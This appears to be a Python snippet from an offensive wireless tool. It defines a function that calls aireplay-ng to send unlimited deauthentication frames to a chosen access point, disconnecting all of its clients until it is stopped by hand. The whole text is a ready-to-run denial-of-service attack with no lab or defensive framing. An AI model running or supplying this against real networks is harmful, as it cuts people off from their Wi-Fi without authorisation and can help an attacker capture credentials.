import subprocess

def run_deauth_attack(bssid, interface):
    print("Starting deauthentication attack...")
    try:
        subprocess.run(["aireplay-ng", "--deauth", "0", "-a", bssid, interface])
    except KeyboardInterrupt:
        print("Deauthentication stopped.")
